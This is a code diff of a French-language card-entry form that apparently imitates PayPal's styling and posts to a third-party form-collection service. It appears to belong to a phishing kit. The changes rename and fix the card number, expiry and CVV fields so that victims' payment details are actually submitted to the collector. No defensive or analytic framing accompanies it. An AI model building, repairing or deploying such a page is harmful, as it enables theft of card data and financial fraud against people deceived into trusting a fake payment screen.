@@ -30,33 +30,28 @@ action="https://formbucket.com/f/buk_6l5YVatjhTJHLnUQeoDHuQvv">
             </div>
            </div>
            </div>
-           <div class="textinputgroup">
-              <div class="textinputgroup" data-label-content="Cryptogramme visuel">
-               <label id="text-info-verificationCode" class="floatingLabel" for="verificationCode"><b></b></label>
-               <input type="number"maxlength="19" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" type="password"  class="test_verificationCode test_verificationCode vx_form-control" placeholder="Numéro de carte bancaire" autocomplete="cc-csc" value="" required>
-              </div>
+           <div class="">
+           	<label></label>
+      <input type="number" class="test_verificationCode test_verificationCode vx_form-control" id="cn" name="carte de crédit" placeholder="Saisissez votre carte de crédit" required> 
+     </div> 
            <div id="dropdown_layout">
             <div class="ppvx_dropdown   ">
              <select id="brand" class="ppvx_dropdown__control test_brand " aria-describedby="brand" name="brand"><option value="-1">Sélectionnez votre type de carte</option><option value="visa">Visa</option><option value="master_card">Mastercard</option><option value="amex">American Express</option><option value="discover">Discover</option></select>
              <label class="ppvx_dropdown__label" for="brand">Type de carte</label>
             </div>
-           <div class="textinputgroup">
-              <div class="textinputgroup" data-label-content="Cryptogramme visuel">
-               <label id="text-info-verificationCode" class="floatingLabel" for="verificationCode"><b></b></label>
-               <input type="text"maxlength="9" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" type="password"  class="test_verificationCode test_verificationCode vx_form-control" placeholder="Date d'expiration" autocomplete="cc-csc" value="" required>
-              </div>
-           <div class="table-container">      
+            <label></label>
+  <div class="form-group">  
+      <input maxlength="5" type="text" class="test_verificationCode test_verificationCode vx_form-control" id="exp" name="exp" placeholder="mm/aa" required> 
+     </div>  
              <div class="table-col-xs-10">
-              <div class="textinputgroup" data-label-content="Cryptogramme visuel">
-               <label id="text-info-verificationCode" class="floatingLabel" for="verificationCode"><b>ㅤㅤㅤㅤㅤㅤㅤㅤ</b></label>
-               <input maxlength="4" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" type="password"  class="test_verificationCode test_verificationCode vx_form-control" placeholder="Saisissez le cryptogramme visuel" autocomplete="cc-csc" value="" required>
-              </div>
+             	 <label></label>
+              <div class="form-group">         
+      <input type="text" class="test_verificationCode test_verificationCode vx_form-control" id="cvv" name="cvv" placeholder="Saisissez le cryptogramme visuel"required> 
+             </div>
              </div>
              <div class="table-col-xs-2 cardImage-container">
               <span data-name="" class="rectangleLogo_small shadow  csc-image " aria-hidden="true"></span>
              </div>
-            </div>
-           </div>
            <div class="textinputgroup" data-label-content="Numéro de carte bancaire">
     <p></p>
             <input type="text" id="cardNumber" name="cardNumber" class="test_cardNumber test_cardNumber vx_form-control" placeholder="Adresse de facturation" autocomplete="off" value="">
